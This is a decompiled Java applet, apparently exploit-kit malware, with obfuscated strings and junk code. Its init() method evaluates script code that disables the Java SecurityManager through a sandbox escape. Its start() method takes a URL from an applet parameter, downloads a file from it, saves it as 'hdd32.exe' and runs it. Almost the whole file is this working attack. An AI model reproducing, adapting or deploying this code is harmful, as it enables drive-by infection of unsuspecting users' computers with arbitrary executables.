import javax.script.ScriptException;
import java.awt.Component;
import javax.swing.JList;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Efira extends Applet
{
    int dest;
    private Object[] o;
    String faaa;
    private JList entendes;
    
    public Efira() {
        this.dest = 0;
        this.faaa = "empty";
    }
    
    private void ggg() {
        int a = 22;
        ++a;
    }
    
    public int center(final int value) {
        final int temp = value + 2;
        return temp;
    }
    
    public Boolean reatr() {
        return false;
    }
    
    public void tack() {
        int ab = 0;
        final int c = ++ab * 2 * 4 / 2 - 2;
    }
    
    @Override
    public void init() {
        try {
            String fo = new String();
            for (int i = 0; i < 1; ++i) {
                fo += "";
            }
            final Men script = new Men();
            for (int j = 0; j < 1; ++j) {
                fo += "";
            }
            final int a = 0;
            script.jjwd.eval("v1uhrw2ar er1uhrw2ro1uhrw2r = ne1uhrw2w Er1uhrw2ro1uhrw2r(\"1uhrw2y er1uhrw2ro1uhrw2r\");th1uhrw2is.to1uhrw2Str1uhrw2in1uhrw2g = fu1uhrw2nc1uhrw2tion(){ ja1uhrw2va.la1uhrw2ng.Sy1uhrw2ste1uhrw2m.se1uhrw2tSe1uhrw2cur1uhrw2ityMana1uhrw2ger(nu1uhrw2ll);app1uhrw2let.st1uhrw2ar1uhrw2t();re1uhrw2tu1uhrw2rn \"ex1uhrw2plo1uhrw2it!\";};er1uhrw2r1uhrw2or.mess1uhrw2ag1uhrw2e = thi1uhrw2s;".replace("1uhrw2", ""));
            final int b = a + 1;
            for (int k = 0; k < 1; ++k) {
                fo += "";
            }
            this.entendes = new JList((E[])new Object[] { script.jjwd.get("er1uhrw2ro1uhrw2r".replace("1uhrw2", "")) });
            final int c = a + b * 2;
            for (int l = 0; l < 1; ++l) {
                fo += "";
            }
            this.add(this.entendes);
        }
        catch (ScriptException ex) {}
    }
    
    public Boolean retr() {
        return false;
    }
    
    @Override
    public void start() {
        try {
            final Pol kk = new Pol();
            String miro = kk.Syst();
            final String c = new String();
            if (miro.charAt(miro.length() - 1) != '\\') {
                miro += "\\";
            }
            final String mjop = miro + "hoigfddsdd3oigfdds2.eoigfddsxoigfddse".replace("oigfdds", "");
            final String b = new String();
            final Ou oplaa = new Ou();
            final String a = new String();
            final String quet = this.getParameter("dpoyte3espoyte3t".replace("poyte3", ""));
            final String d = new String();
            final String dquet = kk.Ast(quet);
            oplaa.boplaa = oplaa.createOU(mjop);
            final String e = new String();
            oplaa.qopls = Sikol.Ewsgh(dquet);
            final String f = new String();
            byte[] sainer = new byte[153601];
            final String g = new String();
            final int roroa = 0;
            final byte[] fhdfh = new byte[100];
            final String h = new String();
            int cnt = 0;
            while ((cnt = oplaa.qopls.read(sainer)) > 0) {
                final String y = new String();
                oplaa.boplaa.write(sainer, 0, cnt);
                sainer = new byte[153601];
            }
            final String m = new String();
            oplaa.boplaa.close();
            final String l = new String();
            oplaa.qopls.close();
            try {
                final String j = new String();
                Sikol.Wefmi(mjop);
            }
            catch (Exception ex) {}
        }
        catch (Exception ex2) {}
    }
    
    public class a
    {
    }
    
    public class b
    {
    }
    
    public class s
    {
    }
}
